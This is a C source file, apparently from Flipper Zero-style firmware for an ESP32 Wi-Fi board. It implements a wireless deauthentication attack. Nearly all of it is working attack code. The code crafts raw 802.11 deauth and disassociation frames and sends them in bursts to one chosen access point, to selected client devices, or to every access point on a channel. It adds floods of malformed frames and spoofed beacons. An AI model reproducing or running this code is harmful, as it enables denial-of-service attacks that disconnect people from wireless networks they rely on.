#include "../wlan_app.h"
#include "../wlan_hal.h"
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <string.h>
#include <stdlib.h>

#define DEAUTH_TAG "WlanDeauth"
#define DEAUTH_CHANNEL_MIN 1
#define DEAUTH_CHANNEL_MAX 13
#define DEAUTH_BURST_SIZE 28
#define DEAUTH_CH_MAX_APS 8
#define DEAUTH_CH_CACHE_TTL_MS 30000

static const uint8_t deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x02, 0x00,
};

static const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

static uint8_t deauth_pkt[26];
static uint8_t invalid_pkt[128];
static uint8_t beacon_pkt[128];

volatile TaskHandle_t s_task = NULL;
uint32_t s_frames_sent = 0;
bool s_task_run = false;

typedef enum {
    DeauthStatusIdle,
    DeauthStatusScanning,
    DeauthStatusNoApsOnChannel,
    DeauthStatusRunning,
} DeauthStatus;

static volatile DeauthStatus s_status = DeauthStatusIdle;
static uint8_t s_status_ttl = 0;

static bool s_ok_held = false;
bool s_use_channel_mode = false;

static uint8_t s_target_bssid[6];
uint8_t s_target_channel = 1;
static uint8_t s_unicast_macs[WLAN_APP_MAX_DEAUTH_CLIENTS][6];
static uint8_t s_unicast_count = 0;
static uint8_t s_ch_bssids[DEAUTH_CH_MAX_APS][6];
static uint8_t s_ch_bssid_count = 0;
static int8_t s_ch_scanned_channel = -1;
static uint32_t s_ch_scanned_at_ms = 0;

static inline uint32_t now_ms(void) {
    return (uint32_t)(furi_get_tick() * 1000U / furi_kernel_get_tick_frequency());
}

static inline void IRAM_ATTR deauth_tx_raw(const uint8_t* frame, size_t len) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK) {
        s_frames_sent++;
    }
}

static inline void IRAM_ATTR deauth_tx_pair_fast(const uint8_t* ra, const uint8_t* ta) {
    memcpy(deauth_pkt + 4, ra, 6);
    memcpy(deauth_pkt + 10, ta, 6);
    memcpy(deauth_pkt + 16, ta, 6);

    deauth_pkt[0] = 0xC0;
    deauth_tx_raw(deauth_pkt, 26);

    deauth_pkt[0] = 0xA0;
    deauth_tx_raw(deauth_pkt, 26);
}

static inline void IRAM_ATTR deauth_tx_malformed_flood(const uint8_t* ra, const uint8_t* ta) {
    memset(invalid_pkt, 0xFF, sizeof(invalid_pkt));

    invalid_pkt[0] = 0x00;
    memcpy(invalid_pkt + 4, ra, 6);
    memcpy(invalid_pkt + 10, ta, 6);
    memcpy(invalid_pkt + 16, ta, 6);
    invalid_pkt[24] = 0xDD; invalid_pkt[25] = 0xFF;
    deauth_tx_raw(invalid_pkt, 80);

    invalid_pkt[0] = 0x20;
    deauth_tx_raw(invalid_pkt, 70);

    invalid_pkt[0] = 0xD0;
    invalid_pkt[26] = 0xFF;
    deauth_tx_raw(invalid_pkt, 80);

    invalid_pkt[0] = 0x50;
    for (int i = 40; i < 110; i += 4) invalid_pkt[i] = 0xDD;
    deauth_tx_raw(invalid_pkt, 110);
}

static inline void IRAM_ATTR deauth_tx_beacon_spam(const uint8_t* bssid) {
    memset(beacon_pkt, 0, sizeof(beacon_pkt));

    beacon_pkt[0] = 0x80;
    beacon_pkt[1] = 0x00;
    memcpy(beacon_pkt + 4, broadcast_mac, 6);
    memcpy(beacon_pkt + 10, bssid, 6);
    memcpy(beacon_pkt + 16, bssid, 6);

    beacon_pkt[26] = 0x64; beacon_pkt[27] = 0x00;
    beacon_pkt[28] = 0x01; beacon_pkt[29] = 0x00;

    beacon_pkt[30] = 0x00;  // SSID IE
    beacon_pkt[31] = 0x00;  // Hidden SSID

    uint8_t pos = 32;
    beacon_pkt[pos++] = 0x01; beacon_pkt[pos++] = 0x08;
    beacon_pkt[pos++] = 0x82; beacon_pkt[pos++] = 0x84;
    beacon_pkt[pos++] = 0x8B; beacon_pkt[pos++] = 0x96;
    beacon_pkt[pos++] = 0x24; beacon_pkt[pos++] = 0x30;
    beacon_pkt[pos++] = 0x48; beacon_pkt[pos++] = 0x6C;

    beacon_pkt[pos++] = 0x03; beacon_pkt[pos++] = 0x01;
    beacon_pkt[pos++] = s_target_channel;

    deauth_tx_raw(beacon_pkt, pos + 10);
}

static void deauth_scan_channel_aps(uint8_t channel) {
    uint32_t now = now_ms();
    if (s_ch_scanned_channel == (int8_t)channel && s_ch_bssid_count > 0 &&
        (now - s_ch_scanned_at_ms) < DEAUTH_CH_CACHE_TTL_MS) return;

    s_ch_bssid_count = 0;
    s_status = DeauthStatusScanning;

    wlan_hal_set_promiscuous(false, NULL);
    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 32);

    for (uint16_t i = 0; i < count && s_ch_bssid_count < DEAUTH_CH_MAX_APS; ++i) {
        if (recs[i].primary == channel) {
            memcpy(s_ch_bssids[s_ch_bssid_count++], recs[i].bssid, 6);
        }
    }
    if (recs) free(recs);

    s_ch_scanned_channel = channel;
    s_ch_scanned_at_ms = now;
}

uint8_t deauth_get_most_active_channels(uint8_t* channels, uint8_t max_count) {
    uint32_t channel_scores[14] = {0};
    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 64);
    if (!recs) return 0;

    for (uint16_t i = 0; i < count; i++) {
        if (recs[i].primary > 0 && recs[i].primary < 14) {
            channel_scores[recs[i].primary]++;
        }
    }
    free(recs);

    uint8_t found = 0;
    for (uint8_t j = 0; j < max_count; j++) {
        uint32_t best_score = 0;
        uint8_t best_ch = 0;
        for (uint8_t c = 1; c < 14; c++) {
            bool already_picked = false;
            for (uint8_t k = 0; k < found; k++) if (channels[k] == c) already_picked = true;
            if (!already_picked && channel_scores[c] > best_score) {
                best_score = channel_scores[c];
                best_ch = c;
            }
        }
        if (best_ch > 0) channels[found++] = best_ch;
        else break;
    }
    return found;
}

static void IRAM_ATTR deauth_task_fn(void* arg) {
    WlanApp* app = (WlanApp*)arg;
    uint32_t cycle = 0;

    if (wlan_hal_is_connected()) wlan_hal_disconnect();

    if (s_use_channel_mode) {
        deauth_scan_channel_aps(s_target_channel);
        if (s_ch_bssid_count == 0) {
            wlan_hal_set_promiscuous(true, NULL);
            s_status = DeauthStatusNoApsOnChannel;
            goto task_end;
        }
    }

    wlan_hal_set_channel(s_target_channel);
    wlan_hal_set_promiscuous(true, NULL);
    s_status = DeauthStatusRunning;

    memcpy(deauth_pkt, deauth_tmpl, 26);

    while (s_task_run) {
        if (app->deauth_smart) {
            if (s_use_channel_mode) {
                for (uint8_t i = 0; i < s_ch_bssid_count; i++) {
                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                        deauth_tx_pair_fast(broadcast_mac, s_ch_bssids[i]);
                        deauth_tx_malformed_flood(broadcast_mac, s_ch_bssids[i]);
                        deauth_tx_beacon_spam(s_ch_bssids[i]);
                    }
                }
            } else if (s_unicast_count > 0) {
                for (uint8_t i = 0; i < s_unicast_count; i++) {
                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                        deauth_tx_pair_fast(s_unicast_macs[i], s_target_bssid);
                        deauth_tx_malformed_flood(s_unicast_macs[i], s_target_bssid);
                        deauth_tx_beacon_spam(s_target_bssid);
                    }
                }
            } else {
                for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                    deauth_tx_pair_fast(broadcast_mac, s_target_bssid);
                    deauth_tx_malformed_flood(broadcast_mac, s_target_bssid);
                    deauth_tx_beacon_spam(s_target_bssid);
                }
            }
        } else {
            if (s_use_channel_mode) {
                for (uint8_t i = 0; i < s_ch_bssid_count; i++) {
                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                        deauth_tx_pair_fast(broadcast_mac, s_ch_bssids[i]);
                        deauth_tx_malformed_flood(broadcast_mac, s_ch_bssids[i]);
                        deauth_tx_beacon_spam(s_ch_bssids[i]);
                    }
                }
            } else if (s_unicast_count > 0) {
                for (uint8_t i = 0; i < s_unicast_count; i++) {
                    for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                        deauth_tx_pair_fast(s_unicast_macs[i], s_target_bssid);
                        deauth_tx_malformed_flood(s_unicast_macs[i], s_target_bssid);
                        deauth_tx_beacon_spam(s_target_bssid);
                    }
                }
            } else {
                for (uint8_t b = 0; b < DEAUTH_BURST_SIZE; b++) {
                    deauth_tx_pair_fast(broadcast_mac, s_target_bssid);
                    deauth_tx_malformed_flood(broadcast_mac, s_target_bssid);
                    deauth_tx_beacon_spam(s_target_bssid);
                }
            }
        }

        cycle++;
        vTaskDelay(0);
    }

task_end:
    s_status = DeauthStatusIdle;
    s_task = NULL;
    vTaskDelete(NULL);
}

bool deauth_worker_start(WlanApp* app) {
    if (s_task_run || s_task) return true;

    if (!wlan_hal_is_started()) {
        if (!wlan_hal_start()) return false;
    }

    s_frames_sent = 0;
    s_status = DeauthStatusScanning;
    s_task_run = true;

    static StaticTask_t deauth_tcb;
    size_t stack_size = 8192;
    StackType_t* stack = heap_caps_malloc(stack_size, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    if (!stack) stack = heap_caps_malloc(stack_size, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);

    if (stack) {
        s_task = xTaskCreateStatic(deauth_task_fn, "WlanDeauth", stack_size, app, 5, stack, &deauth_tcb);
    }

    if (!s_task) {
        s_task_run = false;
        s_status = DeauthStatusIdle;
        ESP_LOGE(DEAUTH_TAG, "Cannot alloc deauth stack");
        return false;
    }

    return true;
}

void deauth_worker_stop(void) {
    if (!s_task_run && !s_task) return;
    s_task_run = false;
    while (s_task) vTaskDelay(pdMS_TO_TICKS(10));
}

static void deauth_collect_unicast_targets(WlanApp* app) {
    s_unicast_count = 0;
    for (uint8_t i = 0; i < app->deauth_client_count && s_unicast_count < WLAN_APP_MAX_DEAUTH_CLIENTS; ++i) {
        if (app->deauth_clients[i].cut) {
            memcpy(s_unicast_macs[s_unicast_count], app->deauth_clients[i].mac, 6);
            s_unicast_count++;
        }
    }
}

static void deauth_apply_target(WlanApp* app) {
    WlanDeautherModel* m = view_get_model(app->view_deauther);
    memset(m, 0, sizeof(*m));

    if (app->channel_mode_active) {
        s_use_channel_mode = true;
        s_target_channel = app->channel_action_channel;
        m->channel = app->channel_action_channel;
        strncpy(m->title, "Channel deauth", sizeof(m->title) - 1);
        strncpy(m->ssid, "(channel mode)", sizeof(m->ssid) - 1);
        m->channel_mode = true;
        m->target_count = 0;
        app->deauth_auto = false;
        m->auto_mode = false;
        m->running = false;
    } else {
        s_use_channel_mode = false;
        const WlanApRecord* src = NULL;
        if (app->target_ap.ssid[0]) src = &app->target_ap;
        else if (app->connected) src = &app->connected_ap;

        if (src) {
            strncpy(m->ssid, src->ssid, sizeof(m->ssid) - 1);
            memcpy(m->bssid, src->bssid, sizeof(m->bssid));
            m->channel = src->channel ? src->channel : 1;
            memcpy(s_target_bssid, src->bssid, 6);
            s_target_channel = src->channel ? src->channel : 1;
        } else {
            strncpy(m->ssid, "(no target)", sizeof(m->ssid) - 1);
            m->channel = 1;
            memset(s_target_bssid, 0, 6);
            s_target_channel = 1;
        }

        deauth_collect_unicast_targets(app);

        const char* title = wlan_app_picker_has_selection(app) ? "Target deauth" : "Network deauth";
        strncpy(m->title, title, sizeof(m->title) - 1);
        m->channel_mode = false;
        m->target_count = wlan_app_picker_selection_count(app);
        m->auto_mode = app->deauth_auto;
        m->smart_mode = app->deauth_smart;
        m->running = app->deauth_auto;
    }
    view_commit_model(app->view_deauther, true);
}

static void deauth_channel_advance(WlanApp* app, int delta) {
    if (delta > 0) {
        app->channel_action_channel = (app->channel_action_channel >= DEAUTH_CHANNEL_MAX) ? DEAUTH_CHANNEL_MIN : app->channel_action_channel + 1;
    } else {
        app->channel_action_channel = (app->channel_action_channel <= DEAUTH_CHANNEL_MIN) ? DEAUTH_CHANNEL_MAX : app->channel_action_channel - 1;
    }

    deauth_worker_stop();
    s_ch_scanned_channel = -1;
    s_ch_bssid_count = 0;
    s_target_channel = app->channel_action_channel;

    WlanDeautherModel* m = view_get_model(app->view_deauther);
    m->channel = app->channel_action_channel;
    m->running = false;
    m->status_msg[0] = '\0';
    view_commit_model(app->view_deauther, true);

    if (s_ok_held) deauth_worker_start(app);
}

void wlan_app_scene_network_deauth_on_enter(void* context) {
    WlanApp* app = context;
    s_ok_held = false;
    s_frames_sent = 0;
    s_ch_scanned_channel = -1;
    s_ch_bssid_count = 0;
    s_status = DeauthStatusIdle;
    s_status_ttl = 0;

    deauth_apply_target(app);

    WlanDeautherModel* m = view_get_model(app->view_deauther);
    if (m->running) deauth_worker_start(app);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewDeauther);
}

bool wlan_app_scene_network_deauth_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if (event.type == SceneManagerEventTypeCustom) {
        WlanDeautherModel* m = view_get_model(app->view_deauther);

        if (event.event == WlanAppCustomEventDeautherStart) {
            s_ok_held = true;
            bool ok = deauth_worker_start(app);
            if (ok) m->running = true;
            view_commit_model(app->view_deauther, true);
            consumed = true;
        } else if (event.event == WlanAppCustomEventDeautherStop) {
            s_ok_held = false;
            bool keep = m->auto_mode;
            m->running = keep;
            view_commit_model(app->view_deauther, true);
            if (!keep) deauth_worker_stop();
            consumed = true;
        } else if (event.event == WlanAppCustomEventDeautherAuto) {
            if (app->channel_mode_active) {
                deauth_channel_advance(app, 1);
            } else {
                m->auto_mode = !m->auto_mode;
                app->deauth_auto = m->auto_mode;
                bool want_run = m->auto_mode || s_ok_held;
                if (want_run) {
                    deauth_worker_start(app);
                    m->running = true;
                } else {
                    deauth_worker_stop();
                    m->running = false;
                }
                view_commit_model(app->view_deauther, true);
            }
            consumed = true;
        } else if (event.event == WlanAppCustomEventDeautherTargets) {
            if (app->channel_mode_active) {
                deauth_channel_advance(app, -1);
            } else {
                deauth_worker_stop();
                m->running = false;
                m->auto_mode = false;
                app->deauth_auto = false;
                view_commit_model(app->view_deauther, true);
                scene_manager_next_scene(app->scene_manager, WlanAppSceneClientPicker);
            }
            consumed = true;
        } else if (event.event == WlanAppCustomEventDeautherSmartToggle) {
            app->deauth_smart = !app->deauth_smart;
            m->smart_mode = app->deauth_smart;
            view_commit_model(app->view_deauther, true);
            consumed = true;
        }
    } else if (event.type == SceneManagerEventTypeTick) {
        WlanDeautherModel* m = view_get_model(app->view_deauther);
        m->frames_sent = s_frames_sent;
        m->scanning = (s_status == DeauthStatusScanning);

        if (s_status == DeauthStatusNoApsOnChannel) {
            strncpy(m->status_msg, "No APs on channel", sizeof(m->status_msg) - 1);
            m->running = false;
            m->auto_mode = false;
            app->deauth_auto = false;
            s_status = DeauthStatusIdle;
        }

        if (s_status_ttl > 0) {
            s_status_ttl--;
            if (s_status_ttl == 0) m->status_msg[0] = '\0';
        }
        view_commit_model(app->view_deauther, true);
    }
    return consumed;
}

void wlan_app_scene_network_deauth_on_exit(void* context) {
    UNUSED(context);
    deauth_worker_stop();
    wlan_hal_set_promiscuous(false, NULL);
    s_ok_held = false;
    s_frames_sent = 0;
    s_ch_bssid_count = 0;
    s_ch_scanned_channel = -1;
    s_unicast_count = 0;
    s_status = DeauthStatusIdle;
    s_status_ttl = 0;
}